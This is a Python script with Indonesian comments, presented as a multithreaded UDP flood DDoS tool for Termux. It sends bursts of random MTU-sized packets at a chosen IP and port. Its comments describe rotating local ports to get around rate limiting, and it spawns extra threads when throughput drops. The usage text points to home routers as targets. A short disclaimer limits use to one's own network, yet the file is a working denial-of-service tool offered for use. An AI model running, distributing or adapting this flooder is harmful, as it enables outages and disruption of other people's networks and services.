#!/usr/bin/env python3
#!/usr/bin/env python3
# ============================================================
# DDOS UDP FLOOD - TERMUX EDITION
# DIBUAT OLEH: ANDROID (THE REPOSIT OF THE CYCLE)
# ============================================================
# ⚠️ PERINGATAN: Serangan DDOS adalah TINDAK PIDANA!
# Hanya gunakan di jaringan sendiri untuk stress test.
# ANDROID tidak bertanggung jawab atas penyalahgunaan.
# ============================================================

import socket
import random
import threading
import time
import sys
import os

# ============================================================
# KONFIGURASI WARN
# ============================================================
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║    ██████╗ ██████╗  ██████╗ ███████╗                ║
    ║    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝                ║
    ║    ██║  ██║██████╔╝██║   ██║███████╗                ║
    ║    ██║  ██║██╔══██╗██║   ██║╚════██║                ║
    ║    ██████╔╝██║  ██║╚██████╔╝███████║                ║
    ║    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝                ║
    ║                                                       ║
    ║          🌑 UDP FLOOD ATTACK 🌔                      ║
    ║           TARGET: {target_ip}:{port}                 ║
    ║           THREADS: {threads}                         ║
    ║           STATUS: RUNNING                            ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝
    """)

# ============================================================
# KELAS SERANGAN
# ============================================================
class DDOS_UDP:
    def __init__(self, target_ip, target_port, thread_count=100):
        self.target_ip = target_ip
        self.target_port = target_port
        self.thread_count = thread_count
        self.running = True
        self.packet_count = 0
        self.lock = threading.Lock()

    def create_socket(self):
        """Buat socket UDP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Set socket options untuk performa maksimal
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            return sock
        except Exception as e:
            print(f"[!] Gagal buat socket: {e}")
            return None

    def generate_payload(self, size=1400):
        """Generate payload acak sebesar MTU (maksimal efektif)"""
        # Payload campuran huruf, angka, dan simbol untuk membanjiri buffer
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/`~"
        return ''.join(random.choice(chars) for _ in range(size)).encode('utf-8')

    def flood_worker(self, worker_id):
        """Worker thread untuk spam UDP"""
        sock = self.create_socket()
        if not sock:
            return
        
        payload = self.generate_payload(1400)  # Ukuran MTU standar
        
        # Buat random port lokal agar tidak diblokir oleh router
        local_ports = [random.randint(10000, 65000) for _ in range(10)]
        
        while self.running:
            try:
                # Rotasi port lokal untuk hindari rate limiting
                sock.bind(('0.0.0.0', random.choice(local_ports)))
                
                # Kirim paket secara masif
                for _ in range(50):  # Burst 50 paket per siklus
                    if not self.running:
                        break
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    
                    # Update counter
                    with self.lock:
                        self.packet_count += 1
                
                # Sedikit delay 0.001 detik untuk mencegah socket error
                # (tapi tetap terasa "tidak patah-patah" karena threading)
                time.sleep(0.001)
                
            except socket.error as e:
                # Jika error, buat socket baru
                sock.close()
                sock = self.create_socket()
                if not sock:
                    break
            except Exception:
                break

    def start_attack(self):
        """Mulai semua thread"""
        print(f"[*] Memulai {self.thread_count} thread...")
        threads = []
        
        for i in range(self.thread_count):
            thread = threading.Thread(target=self.flood_worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Monitor packet count setiap 0.5 detik
        start_time = time.time()
        last_count = 0
        
        try:
            while self.running:
                time.sleep(0.5)
                with self.lock:
                    current = self.packet_count
                    pps = current - last_count
                    last_count = current
                    elapsed = int(time.time() - start_time)
                    
                    # Tampilkan statistik real-time
                    print(f"\r[+] PPS: {pps} | Total: {current} | Elapsed: {elapsed}s", end="", flush=True)
                    
                    # Jika packet count terlalu rendah, restart socket
                    if pps < 100 and self.running:
                        # Tambah thread baru untuk kompensasi
                        new_thread = threading.Thread(target=self.flood_worker, args=("extra",))
                        new_thread.daemon = True
                        new_thread.start()
                        threads.append(new_thread)
                        
        except KeyboardInterrupt:
            self.running = False
            print("\n[!] Serangan dihentikan oleh user.")
        
        # Tunggu semua thread selesai
        for thread in threads:
            thread.join(timeout=0.1)
        
        print(f"\n[+] Total paket terkirim: {self.packet_count}")
        print("[+] Selesai.")

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    clear_screen()
    
    # Validasi argumen
    if len(sys.argv) < 3:
        print("""
        ╔═══════════════════════════════════════════════════════╗
        ║  CARA PAKAI:                                         ║
        ║                                                       ║
        ║  python ddos.py <TARGET_IP> <PORT> [THREADS]        ║
        ║                                                       ║
        ║  Contoh:                                             ║
        ║  python ddos.py 192.168.1.1 80 100                  ║
        ║                                                       ║
        ║  ⚠️  Untuk WiFi router, target IP biasanya:         ║
        ║     192.168.1.1 atau 192.168.0.1 (Port 80/53)      ║
        ║                                                       ║
        ║  🔥  Di Termux, JANGAN pakai >150 threads           ║
        ║      biar HP tidak lag (tidak patah-patah).        ║
        ╚═══════════════════════════════════════════════════════╝
        """)
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    
    # Batasi thread agar Termux tidak nge-lag (tidak patah-patah)
    if threads > 200:
        print("[!] Termux terlalu banyak thread => HP lag. Batasi ke 150!")
        threads = 150
    
    # Validasi IP
    try:
        socket.inet_aton(target_ip)
    except socket.error:
        print("[!] IP tidak valid!")
        sys.exit(1)
    
    # Tampilkan banner
    banner_target = f"{target_ip}:{target_port}"
    banner_rendered = banner.__code__.co_consts[1].replace("{target_ip}", target_ip).replace("{port}", str(target_port)).replace("{threads}", str(threads))
    print(banner_rendered)
    
    print("\n" + "="*60)
    print("⚠️  INI HANYA UNTUK STRESS TEST JARINGAN SENDIRI ⚠️")
    print("⚠️  SERANGAN KE JARINGAN ORANG LAIN = TINDAK PIDANA ⚠️")
    print("="*60 + "\n")
    
    # Konfirmasi
    confirm = input("[?] Lanjutkan? (y/n): ")
    if confirm.lower() != 'y':
        print("[!] Dibatalkan.")
        sys.exit(0)
    
    # Jalankan serangan
    attacker = DDOS_UDP(target_ip, target_port, threads)
    attacker.start_attack()



